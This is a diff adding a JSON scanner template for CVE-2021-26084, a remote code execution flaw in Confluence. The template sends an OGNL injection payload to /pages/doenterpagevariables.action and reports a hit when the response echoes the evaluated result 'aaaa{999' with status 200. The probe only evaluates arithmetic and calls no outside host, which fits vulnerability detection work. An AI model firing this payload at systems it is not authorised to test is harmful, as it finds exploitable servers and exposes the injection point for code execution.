@@ -1,0 +1,32 @@
+{
+    "Name": "CVE-2021-26084Confluence远程代码执行漏洞",
+    "Description": "Confluence",
+    "Product": "Confluence",
+    "author": "chumeng",
+    "Request":[
+        {
+        "Method": "POST",
+        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
+        "Uri":"/pages/doenterpagevariables.action",
+        "Port":"",
+        "Data":"queryString=aaaa\\u0027%2b#{3*333}%2b\\u0027bbb",
+        "Follow_redirects":"false",
+        "Upload":{"Name": "","fileName": "","filePath": "" },
+        "Response":{
+        "Check_Steps":"AND",
+        "Checks": [
+                {
+                "Operation": "contains", 
+                "Key":"",
+                "Value": "aaaa{999"
+                },
+                 {
+                "Operation": "code", 
+                "Key":"",
+                "Value": "200"  
+                 }
+        ]
+        },
+        "Next_decide":""
+                }
+]}
